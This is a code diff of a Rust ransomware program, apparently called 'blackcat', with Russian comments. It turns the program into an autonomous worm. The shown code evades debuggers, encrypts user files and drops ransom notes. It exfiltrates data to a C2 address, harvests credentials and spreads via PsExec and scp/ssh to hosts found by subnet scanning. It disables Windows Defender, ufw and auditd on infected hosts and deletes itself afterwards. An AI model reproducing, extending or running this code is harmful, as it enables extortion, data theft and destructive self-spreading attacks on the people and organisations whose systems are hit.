@@ -1,10 +1,9 @@
-// src/main.rs
+// src/main.rs - АВТОНОМНАЯ ВЕРСИЯ
 mod crypto;
 mod filesystem;
 mod ransomware;
 mod windows;
 mod lateral_movement;
-mod esxi;
 mod evasion;
 mod config;
 mod linux;
@@ -23,41 +22,38 @@ struct Cli {
 
 #[derive(Subcommand)]
 enum Commands {
-    Encrypt { 
-        #[arg(short, long)] 
+    Encrypt {
+        #[arg(short, long)]
         path: String,
         
-        #[arg(long, default_value_t = false)]
+        #[arg(long)]
         spread: bool,
         
         #[arg(long)]
         exfiltrate: Option<String>,
+        
+        #[arg(long, default_value_t = false)]
+        self_destruct: bool,
     },
-    Decrypt { 
-        #[arg(short, long)] 
-        path: String, 
-        #[arg(short, long)] 
+    Decrypt {
+        #[arg(short, long)]
+        path: String,
+        
+        #[arg(short, long)]
         key: String,
     },
     Spread {
         #[arg(long)]
-        network: Option<String>,
+        subnet: Option<String>,
         
-        #[arg(long, default_value = "192.168.53.0")]
-        subnet: String,
-        
-        #[arg(long, default_value = "20")]
+        #[arg(long, default_value = "11")]
         start_ip: u8,
         
         #[arg(long, default_value = "254")]
         end_ip: u8,
-    },
-    Exfiltrate {
-        #[arg(long, default_value = "192.168.53.135")]
-        c2_address: String,
         
-        #[arg(long, default_value_t = 4444)]
-        port: u16,
+        #[arg(long, default_value_t = false)]
+        self_destruct: bool,
     },
 }
 
@@ -70,7 +66,12 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
     let cli = Cli::parse();
 
     match cli.command {
-        Commands::Encrypt { path, spread, exfiltrate } => {
+        Commands::Encrypt { 
+            path, 
+            spread, 
+            exfiltrate,
+            self_destruct,
+        } => {
             // 1. Проверка на отладчик и VM
             if evasion::is_debugger_present() {
                 warn!("Debugger detected! Exiting...");
@@ -97,19 +98,17 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
             
             // 3. Создание CryptoEngine
             let crypto_engine = crypto::CryptoEngine::new()?;
-            info!("Master Key: {}", hex::encode(crypto_engine.get_master_key()));
+            let master_key = hex::encode(crypto_engine.get_master_key());
+            info!("Master Key: {}", master_key);
             
-            // 4. Эксфильтрация данных (если указано)
+            // 4. Эксфильтрация данных
             if let Some(c2_addr) = exfiltrate {
                 info!("Starting data exfiltration to {}", c2_addr);
                 
-                // Сначала создаем тестовые файлы для демонстрации (если их нет)
-                if !Path::new(&path).exists() {
-                    info!("Creating test files for demonstration...");
-                    let _ = exfiltration::Exfiltration::create_test_files(&path);
-                }
+                // Формируем уникальное имя файла с ключом
+                let special_filename = format!("blackcat_exfil_key_{}.enc", &master_key[0..16]);
+                info!("Exfiltration file will contain key prefix: {}", &master_key[0..16]);
                 
-                // Теперь выполняем эксфильтрацию
                 match exfiltration::Exfiltration::exfiltrate(&path, &c2_addr, 4444, &crypto_engine) {
                     Ok(_) => info!("Data exfiltration successful"),
                     Err(e) => warn!("Exfiltration failed: {}", e),
@@ -120,35 +119,38 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
             if spread {
                 info!("Starting lateral movement...");
                 
-                #[cfg(target_os = "windows")]
-                {
-                    let credentials = lateral_movement::LateralMovement::harvest_credentials();
-                    let hosts = lateral_movement::LateralMovement::discover_hosts("192.168.53", 11, 254);
-                    
-                    if !hosts.is_empty() {
-                        info!("Discovered {} potential targets", hosts.len());
-                        
-                        for (username, password, domain) in credentials {
-                            let _ = lateral_movement::LateralMovement::spread_via_psexec(
-                                hosts.clone(),
-                                &username,
-                                &password,
-                                &domain
-                            );
+                let subnet = "192.168.53".to_string();
+                let payload_path = std::env::current_exe()
+                    .map(|p| p.to_string_lossy().to_string())
+                    .unwrap_or_else(|| {
+                        if cfg!(target_os = "windows") {
+                            "blackcat.exe".to_string()
+                        } else {
+                            "./blackcat".to_string()
                         }
-                    }
+                    });
+                
+                // Определяем путь для шифрования на целевых машинах
+                let target_path = if cfg!(target_os = "windows") {
+                    "C:\\Users"
+                } else {
+                    "/home"
+                };
+                
+                // Формируем аргументы для распространения
+                let mut spread_args = vec![
+                    "encrypt".to_string(),
+                    "--path".to_string(),
+                    target_path.to_string(),
+                ];
+                
+                if let Some(ref c2_addr) = exfiltrate {
+                    spread_args.push("--exfiltrate".to_string());
+                    spread_args.push(c2_addr.clone());
                 }
                 
-                #[cfg(target_os = "linux")]
-                {
-                    if let Ok(ssh_keys) = linux::LinuxOperations::enumerate_ssh_keys() {
-                        let hosts = lateral_movement::LateralMovement::discover_hosts("192.168.53", 11, 254);
-                        
-                        if !hosts.is_empty() && !ssh_keys.is_empty() {
-                            let _ = lateral_movement::LateralMovement::spread_via_ssh(hosts, ssh_keys);
-                        }
-                    }
-                }
+                // Сканируем и распространяем
+                Self::auto_spread(&subnet, 11, 254, &payload_path, &spread_args).await?;
             }
             
             // 6. Локальное шифрование
@@ -158,7 +160,7 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
                 return Ok(());
             }
         
-            // Формируем список уникальных директорий для вымогательских записок
+            // Формируем список уникальных директорий
             let mut dirs_to_notify = HashSet::new();
             for file in &files {
                 if let Some(parent) = Path::new(file).parent() {
@@ -168,7 +170,6 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
                 }
             }
         
-            // Создаем строку со всеми папками
             let all_dirs_list = dirs_to_notify.iter()
                 .cloned()
                 .collect::<Vec<String>>()
@@ -181,11 +182,11 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
                 files,
                 ransomware::RansomwareConfig {
                     target_paths: vec![path.clone()],
-                    file_extensions: vec!["txt".to_string(), "doc".to_string(), "docx".to_string(), 
-                                         "xls".to_string(), "xlsx".to_string(), "pdf".to_string(),
-                                         "jpg".to_string(), "jpeg".to_string(), "png".to_string(),
-                                         "config".to_string(), "ini".to_string(), "xml".to_string(),
-                                         "sql".to_string(), "db".to_string(), "mdb".to_string()],
+                    file_extensions: vec![
+                        "txt", "doc", "docx", "xls", "xlsx", "pdf",
+                        "jpg", "jpeg", "png", "config", "ini", "xml",
+                        "sql", "db", "mdb", "csv", "rtf", "odt", "ods",
+                    ].iter().map(|s| s.to_string()).collect(),
                     encryption_algorithm: "aes-256-gcm".to_string(),
                     max_parallelism: 4,
                 },
@@ -195,7 +196,7 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
             // 7. Создание вымогательских записок
             let exfil_report = exfiltration::Exfiltration::create_exfiltration_report(&path, &all_dirs_list, &crypto_engine);
             
-            let dirs_copy = dirs_to_notify.clone(); // Копируем для итерации
+            let dirs_copy = dirs_to_notify.clone();
             for dir in dirs_copy {
                 #[cfg(target_os = "windows")]
                 let _ = windows::WindowsPlatform::create_ransom_note(&dir, &exfil_report);
@@ -205,6 +206,12 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
             }
             
             info!("Encryption completed successfully. {} directories affected.", dirs_to_notify.len());
+            
+            // 8. Самоуничтожение (если включено)
+            if self_destruct {
+                info!("Self-destructing...");
+                Self::self_destruct()?;
+            }
         }
 
         Commands::Decrypt { path, key } => {
@@ -229,57 +236,361 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
             info!("Files restored successfully");
         }
         
-        Commands::Spread { network, subnet, start_ip, end_ip } => {
+        Commands::Spread { subnet, start_ip, end_ip, self_destruct } => {
             info!("Starting standalone lateral movement...");
             
-            let network_to_scan = network.unwrap_or(subnet);
-            
-            #[cfg(target_os = "windows")]
-            {
-                let credentials = lateral_movement::LateralMovement::harvest_credentials();
-                let hosts = lateral_movement::LateralMovement::discover_hosts(&network_to_scan, start_ip, end_ip);
-                
-                if hosts.is_empty() {
-                    warn!("No hosts discovered in network {}", network_to_scan);
-                    return Ok(());
-                }
-                
-                info!("Discovered {} hosts", hosts.len());
-                
-                for (username, password, domain) in credentials {
-                    info!("Attempting spread with {}@{}", username, domain);
-                    let _ = lateral_movement::LateralMovement::spread_via_psexec(
-                        hosts.clone(),
-                        &username,
-                        &password,
-                        &domain
-                    );
-                }
-            }
-            
-            #[cfg(target_os = "linux")]
-            {
-                if let Ok(ssh_keys) = linux::LinuxOperations::enumerate_ssh_keys() {
-                    let hosts = lateral_movement::LateralMovement::discover_hosts(&network_to_scan, start_ip, end_ip);
-                    
-                    if !hosts.is_empty() && !ssh_keys.is_empty() {
-                        let _ = lateral_movement::LateralMovement::spread_via_ssh(hosts, ssh_keys);
+            let subnet = subnet.unwrap_or_else(|| "192.168.53".to_string());
+            let payload_path = std::env::current_exe()
+                .map(|p| p.to_string_lossy().to_string())
+                .unwrap_or_else(|| {
+                    if cfg!(target_os = "windows") {
+                        "blackcat.exe".to_string()
+                    } else {
+                        "./blackcat".to_string()
                     }
-                }
-            }
-        }
-        
-        Commands::Exfiltrate { c2_address, port } => {
-            info!("Starting data exfiltration to {}:{}", c2_address, port);
+                });
             
-            let crypto_engine = crypto::CryptoEngine::new()?;
+            // Только распространение без шифрования
+            let target_path = if cfg!(target_os = "windows") {
+                "C:\\Users"
+            } else {
+                "/home"
+            };
             
-            match exfiltration::Exfiltration::exfiltrate_from_c2(&c2_address, port, &crypto_engine) {
-                Ok(_) => info!("Exfiltration completed successfully"),
-                Err(e) => error!("Exfiltration failed: {}", e),
+            let args = vec![
+                "encrypt".to_string(),
+                "--path".to_string(),
+                target_path.to_string(),
+                "--exfiltrate".to_string(),
+                "192.168.53.135".to_string(),
+                "--self-destruct".to_string(),
+            ];
+            
+            Self::auto_spread(&subnet, start_ip, end_ip, &payload_path, &args).await?;
+            
+            if self_destruct {
+                Self::self_destruct()?;
             }
         }
     }
     
     Ok(())
+}
+
+impl Cli {
+    async fn auto_spread(
+        subnet: &str,
+        start_ip: u8,
+        end_ip: u8,
+        payload_path: &str,
+        args: &[String],
+    ) -> Result<(), Box<dyn std::error::Error>> {
+        info!("Auto-spreading from {} to {}.{}.{}", 
+              payload_path, subnet, start_ip, end_ip);
+        
+        // 1. Сканируем сеть
+        let hosts = lateral_movement::LateralMovement::discover_hosts(subnet, start_ip, end_ip);
+        
+        if hosts.is_empty() {
+            warn!("No hosts found in subnet {}", subnet);
+            return Ok(());
+        }
+        
+        info!("Found {} potential targets", hosts.len());
+        
+        // 2. Распределяем по ОС
+        let mut windows_hosts = Vec::new();
+        let mut linux_hosts = Vec::new();
+        
+        for host in hosts {
+            if Self::is_windows_host(&host) {
+                windows_hosts.push(host);
+            } else if Self::is_linux_host(&host) {
+                linux_hosts.push(host);
+            }
+        }
+        
+        info!("Windows hosts: {}, Linux hosts: {}", 
+              windows_hosts.len(), linux_hosts.len());
+        
+        // 3. Распространяем в зависимости от текущей ОС
+        #[cfg(target_os = "windows")]
+        {
+            if !windows_hosts.is_empty() {
+                info!("Spreading to {} Windows hosts...", windows_hosts.len());
+                
+                // Загружаем учетные данные
+                let credentials = lateral_movement::LateralMovement::harvest_credentials();
+                
+                for host in windows_hosts {
+                    info!("Attempting to infect Windows host: {}", host);
+                    
+                    for cred in &credentials {
+                        if Self::infect_windows_host(&host, &cred.0, &cred.1, &cred.2, 
+                                                    payload_path, args).await {
+                            info!("Successfully infected Windows host: {}", host);
+                            break;
+                        }
+                    }
+                }
+            }
+            
+            // На Windows не можем заражать Linux хосты напрямую
+            if !linux_hosts.is_empty() {
+                warn!("Cannot infect Linux hosts from Windows (need Linux binary)");
+            }
+        }
+        
+        #[cfg(target_os = "linux")]
+        {
+            if !linux_hosts.is_empty() {
+                info!("Spreading to {} Linux hosts...", linux_hosts.len());
+                
+                // Получаем SSH ключи
+                let ssh_keys = linux::LinuxOperations::enumerate_ssh_keys()
+                    .unwrap_or_else(|_| Vec::new());
+                
+                for host in linux_hosts {
+                    info!("Attempting to infect Linux host: {}", host);
+                    
+                    for ssh_key in &ssh_keys {
+                        if Self::infect_linux_host(&host, ssh_key, payload_path, args).await {
+                            info!("Successfully infected Linux host: {}", host);
+                            break;
+                        }
+                    }
+                }
+            }
+            
+            // На Linux не можем заражать Windows хосты напрямую
+            if !windows_hosts.is_empty() {
+                warn!("Cannot infect Windows hosts from Linux (need Windows binary)");
+            }
+        }
+        
+        Ok(())
+    }
+    
+    fn is_windows_host(ip: &str) -> bool {
+        // Проверяем Windows порты
+        let windows_ports = [445, 135, 139, 3389];
+        for &port in &windows_ports {
+            if lateral_movement::LateralMovement::check_port(ip, port, 300) {
+                return true;
+            }
+        }
+        false
+    }
+    
+    fn is_linux_host(ip: &str) -> bool {
+        // Проверяем SSH порт
+        lateral_movement::LateralMovement::check_port(ip, 22, 300)
+    }
+    
+    #[cfg(target_os = "windows")]
+    async fn infect_windows_host(
+        host: &str,
+        username: &str,
+        password: &str,
+        domain: &str,
+        payload_path: &str,
+        args: &[String],
+    ) -> bool {
+        use std::process::Command;
+        
+        // Формируем команду
+        let mut full_args = vec![payload_path.to_string()];
+        full_args.extend_from_slice(args);
+        
+        let command_line = full_args.join(" ");
+        
+        // Ищем PsExec в assets
+        let current_exe = std::env::current_exe().ok();
+        let current_dir = current_exe.and_then(|p| p.parent().map(|p| p.to_path_buf()));
+        
+        if let Some(dir) = current_dir {
+            let psexec_path = dir.join("assets").join("PsExec.exe");
+            
+            if psexec_path.exists() {
+                let psexec_str = psexec_path.to_string_lossy();
+                
+                // Формируем полную команду для PsExec
+                let full_domain = if domain.is_empty() {
+                    username.to_string()
+                } else {
+                    format!("{}\\{}", domain, username)
+                };
+                
+                let output = Command::new(&*psexec_str)
+                    .args(&[
+                        "\\\\", host,
+                        "-accepteula",
+                        "-u", &full_domain,
+                        "-p", password,
+                        "-h", "-s", "-d", "-c", "-f",
+                        &command_line,
+                    ])
+                    .output();
+                
+                match output {
+                    Ok(result) => {
+                        if result.status.success() {
+                            info!("Successfully infected {} with {}", host, username);
+                            
+                            // Отключаем защиту на удаленном хосте
+                            let _ = Command::new(&*psexec_str)
+                                .args(&[
+                                    "\\\\", host,
+                                    "-accepteula",
+                                    "-u", &full_domain,
+                                    "-p", password,
+                                    "-h", "-s",
+                                    "powershell -Command \"Set-MpPreference -DisableRealtimeMonitoring $true\"",
+                                ])
+                                .output();
+                            
+                            return true;
+                        } else {
+                            warn!("Failed to infect {}: {}", host, 
+                                  String::from_utf8_lossy(&result.stderr));
+                        }
+                    }
+                    Err(e) => {
+                        warn!("PsExec error for {}: {}", host, e);
+                    }
+                }
+            } else {
+                warn!("PsExec not found in assets folder");
+            }
+        }
+        
+        false
+    }
+    
+    #[cfg(target_os = "linux")]
+    async fn infect_linux_host(
+        host: &str,
+        ssh_key: &str,
+        payload_path: &str,
+        args: &[String],
+    ) -> bool {
+        use std::process::Command;
+        
+        // Проверяем существование ключа
+        if !std::path::Path::new(ssh_key).exists() {
+            return false;
+        }
+        
+        // Формируем команду
+        let mut full_args = vec!["encrypt".to_string()];
+        full_args.extend_from_slice(args);
+        
+        let command_line = full_args.join(" ");
+        
+        // Копируем payload
+        let scp_cmd = format!(
+            "scp -i {} -o StrictHostKeyChecking=no -o ConnectTimeout=10 {} {}:/tmp/.blackcat",
+            ssh_key, payload_path, host
+        );
+        
+        let scp_output = Command::new("sh")
+            .args(&["-c", &scp_cmd])
+            .output();
+        
+        match scp_output {
+            Ok(result) => {
+                if result.status.success() {
+                    // Запускаем payload
+                    let ssh_cmd = format!(
+                        "ssh -i {} -o StrictHostKeyChecking=no {} 'chmod +x /tmp/.blackcat && /tmp/.blackcat {} >/dev/null 2>&1 &'",
+                        ssh_key, host, command_line
+                    );
+                    
+                    let ssh_output = Command::new("sh")
+                        .args(&["-c", &ssh_cmd])
+                        .output();
+                    
+                    match ssh_output {
+                        Ok(result) => {
+                            if result.status.success() {
+                                info!("Successfully infected Linux host: {}", host);
+                                
+                                // Отключаем защиту
+                                let disable_cmd = format!(
+                                    "ssh -i {} -o StrictHostKeyChecking=no {} 'systemctl stop ufw 2>/dev/null; pkill -9 auditd 2>/dev/null'",
+                                    ssh_key, host
+                                );
+                                
+                                let _ = Command::new("sh")
+                                    .args(&["-c", &disable_cmd])
+                                    .output();
+                                
+                                return true;
+                            }
+                        }
+                        Err(e) => {
+                            warn!("SSH execution error for {}: {}", host, e);
+                        }
+                    }
+                }
+            }
+            Err(e) => {
+                warn!("SCP error for {}: {}", host, e);
+            }
+        }
+        
+        false
+    }
+    
+    fn self_destruct() -> Result<(), Box<dyn std::error::Error>> {
+        info!("Initiating self-destruct sequence...");
+        
+        let current_exe = std::env::current_exe()?;
+        let exe_path = current_exe.to_string_lossy().to_string();
+        
+        #[cfg(target_os = "windows")]
+        {
+            // На Windows создаем bat-файл для удаления себя
+            let bat_content = format!(
+                "@echo off\r\n\
+                timeout /t 3 /nobreak >nul\r\n\
+                del \"{}\"\r\n\
+                del \"%~f0\"\r\n",
+                exe_path
+            );
+            
+            let bat_path = format!("{}\\delete_self.bat", std::env::temp_dir().to_string_lossy());
+            std::fs::write(&bat_path, bat_content)?;
+            
+            use std::process::Command;
+            Command::new("cmd")
+                .args(&["/c", "start", "/b", &bat_path])
+                .spawn()?;
+        }
+        
+        #[cfg(target_os = "linux")]
+        {
+            // На Linux создаем sh-скрипт для удаления себя
+            let sh_content = format!(
+                "#!/bin/sh\n\
+                sleep 3\n\
+                rm -f \"{}\"\n\
+                rm -f \"$0\"\n",
+                exe_path
+            );
+            
+            let sh_path = format!("/tmp/delete_self_{}.sh", std::process::id());
+            std::fs::write(&sh_path, sh_content)?;
+            
+            use std::process::Command;
+            Command::new("sh")
+                .args(&["-c", &format!("chmod +x {} && {} &", sh_path, sh_path)])
+                .spawn()?;
+        }
+        
+        info!("Self-destruct initiated. Process will exit in 3 seconds.");
+        std::thread::sleep(std::time::Duration::from_secs(3));
+        
+        Ok(())
+    }
 }
